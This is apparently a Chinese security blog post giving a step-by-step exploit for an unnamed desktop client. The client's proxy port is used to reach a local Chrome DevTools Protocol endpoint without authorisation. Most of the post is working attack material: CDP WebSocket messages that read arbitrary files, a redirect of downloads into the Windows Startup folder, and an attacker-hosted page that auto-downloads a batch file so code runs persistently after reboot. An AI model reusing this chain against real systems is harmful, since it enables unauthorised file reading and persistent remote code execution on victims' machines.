---
title: 【客户端安全】代理绕过127监听CDP+Websocket协议未授权RCE漏洞
url: https://mp.weixin.qq.com/s/fQpansPQgG_9YKMVknKaiQ
source: Doonsec's feed
date: 2026-09-24
fetch_date: 2026-09-25T06:51:40.118718
---

# 【客户端安全】代理绕过127监听CDP+Websocket协议未授权RCE漏洞

# 【客户端安全】代理绕过127监听CDP+Websocket协议未授权RCE漏洞

原创

挖个洞先
挖个洞先

挖个洞先

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**“**

你上天入地我笑得想抽儿，

你大发慈悲我冷得发抖，

眼看你衣冠楚楚忘了遮羞，

月黑风高可别回头，

可怜你 招摇过市却步履蹒跚，

你说我还嫩 麻烦照照镜子行么，

我洋洋洒洒等的不过一记耳光，

就害人害己害了寻常。——《心静自然凉》

**”**

01

—

广告

承接项目，Web，App/PC客户端，物联网设备，联系方式todo243298（不接攻防不接公安）。

02

—

操作步骤

1、18667端口监听::

```
Get-NetTCPConnection -State Listen | Where-Object {$_.OwningProcess -in (Get-Process xxx -ErrorAction SilentlyContinue).Id} | Select LocalAddress,LocalPort,OwningProcess | Format-Table
```

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcLicGVaVdDGsOtjCYzjiapfTPpudU59XLIbS3hI86XPEDyCwJsmQT1jG1jvdtUX6VwMaqzVpL29dicLRdyibzYJ5f6NQrsYfO6uwlu4/640?wx_fmt=png&from=appmsg)

2、yakit配置全局代理为目标机器ip:port，通过B机器攻击A机器

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL81gIibxKbtk5AV8bXBYpStMSAkzq1CMkFcgA1eJQGzlGoxVyQoHWaDK6kujibvlj4ws1Og0wZHEzAhFXW6icXkhurphkfERtOlSo/640?wx_fmt=png&from=appmsg)

3、获取ws会话

9222端口监听127，不能远程触发，通过代理端口绕过

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcLicO6XkxFpamQLsF53WZmicX29XhQK3NSWO7iajrMYSibVibR8uY5iayF8iaHrBVlv5LcBjQAOQgszx1Kn54yk0rDs7895bichlicCTYQQY/640?wx_fmt=png&from=appmsg)

```
GET /json/version HTTP/1.1Host: 127.0.0.1:9222
```

4、连接ws，查看版本测试

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcLibIrtYJmDMXkLvupDBoEh2RLP9ssyG3C8SMYbMEea2rk4mibev1fIeYTMg0InrStjeZ4XibzFgUHt1y4jsTxkf2ibXvJicJu5z6cmM/640?wx_fmt=png&from=appmsg)

```
GET /devtools/browser/6f8b762b-b23e-458e-a7c5-eab788c69b7b HTTP/1.1Host: 127.0.0.1:9222Accept-Language: zh-CN,zh;q=0.9Sec-WebSocket-Key: zpRVZDnNfCd+sYVS/DnNug==Accept-Encoding: gzip, deflate, br, zstdConnection: UpgradeSec-WebSocket-Version: 13Upgrade: websocket
```

```
{"id":1,"method":"Browser.getVersion","params":{}}
```

5、获取"sessionId": "EF1C7304D8865F996D25A75EB036E024"

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL9IiaibTxGKLfyzzQYQcZxr7sKgFaGibfDAibxNUicUPSNwOsSD9gTSfUzuSfiad32fbKhrqyxKRqfcA7QcHib49El0iakdaDCEciaRgrVc/640?wx_fmt=png&from=appmsg)

```
{"id":1,"method":"Target.createTarget","params":{"url":"about:blank"}}
```

```
{"id":2,"method":"Target.attachToTarget","params":{"targetId":"D12F693F545E2AD693BECD227CC6E22A","flatten":true}}
```

6、file:// 读取任意文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcLib9rvGGaqhqDk2Flpen6xfI76hBUFI4gNgbYgLrpTULDI4q2Wg3Qn2YwIYkjBFiaxd9GspplFYp3lJl5Fp5RgApbzpQ3WK1uvak/640?wx_fmt=png&from=appmsg)

```
{"id":3,"method":"Page.navigate","params":{"url":"file:///C:/Windows/win.ini"},"sessionId":"EF1C7304D8865F996D25A75EB036E024"}
```

7、查看文件内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL8JvTjuYcibDHvx8TO5kxjcr5OtJRdR1ia9jwP68NhZNGrmoaJm6xWPHghWictcibNVKva2TpeY4X95rHlxSzsY10j7G11qWhuB49g/640?wx_fmt=png&from=appmsg)

```
{"id":4,"method":"Runtime.evaluate","params":{"expression":"document.body.innerText"},"sessionId":"EF1C7304D8865F996D25A75EB036E024"}
```

8、确认文件内容

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL9buZbBdTZcx0YsVu8fokjQ0lKuNPbb7JJtibCuUvQ503rgFYpNiaLESa88oky8a6KnnW1bswsib7ZvKkzGEUzK3hzW8bqFoAJbicE/640?wx_fmt=png&from=appmsg)

9、任意文件写入

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL9GUoTWWw2vsCGJOxibSVFaEt7wLGGNs9tbzqmbVXqHM6w1ALIfDTIyh15iaOCKdoopJZ1sBgXuJrhewK5ZhDy9bsYbbQD7gLp4w/640?wx_fmt=png&from=appmsg)

```
{"id":5,"method":"Browser.setDownloadBehavior","params":{"behavior":"allow","downloadPath":"C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup","eventsEnabled":true}}
```

10、构建自动下载页面，导航页面

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcLibrLrgUHrAB7WjwrHMF9ZOXdRSRibrctvDqxic3jxyiaa11FKOibQORtqYS4rA3ic2I0dDhIibLcvJ6tjLQBMenT2W8XIf9AG2SVb8So/640?wx_fmt=png&from=appmsg)

```
{"id":6,"method":"Page.navigate","params":{"url":"http://10.130.195.164:9999/drop.html"},"sessionId":"EF1C7304D8865F996D25A75EB036E024"}
```

11、文件内容

![](https://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL9H7g1dS0nFEnbP12XxB93IlTjCXJlic8EIUSCh2rSEwzrDZD6nYiaItqUwoS989tNwzt9AC2ltrMZAWGYttEJ0AsCXsTibpkiaNsc/640?wx_fmt=png&from=appmsg)

```
<!DOCTYPE html><html><body><a id="a" href="calc.bat" download>update</a><script>document.getElementById('a').click();</script></body></html>
```

```
@echo offstart calc
```

12、启动目录持久化 RCE

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcL9zBL6MGibv8JIaLYbMsGUHVN8ep0HdJpMSrQPseLhqgNeCv4nVRBtdJCcbyR88L29Pd5u4Cz3DHggsw2o1K22VJ11MEzicV1OFA/640?wx_fmt=png&from=appmsg)

```
{"id":7,"method":"Page.navigate","params":{"url":"file:///C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start%20Menu/Programs/Startup/"},"sessionId":"EF1C7304D8865F996D25A75EB036E024"}
```

```
{"id":8,"method":"Runtime.evaluate","params":{"expression":"document.body.innerText"},"sessionId":"EF1C7304D8865F996D25A75EB036E024"}
```

13、重启电脑后触发RCE漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/vRTpz13XcLibNyia273JNc7925OH6IECqqlIlUUtjeBnjEB5iaUf47jdiceBjxnIVVm1u2icChW9dibW6FkibkTyImMSLHypKKjNexAlVVH6ibXOpM8/640?wx_fmt=png&from=appmsg)

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/vRTpz13XcL9JgmqXFZSPcaqyGsr3TeRvHibxR9e3VA1HtNvjNr1CpRegjl6R3sLIEK0UiajJ3Nd3dLog4ibNZK8ksqdPudmfMEQgPJKHsTR1eE/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过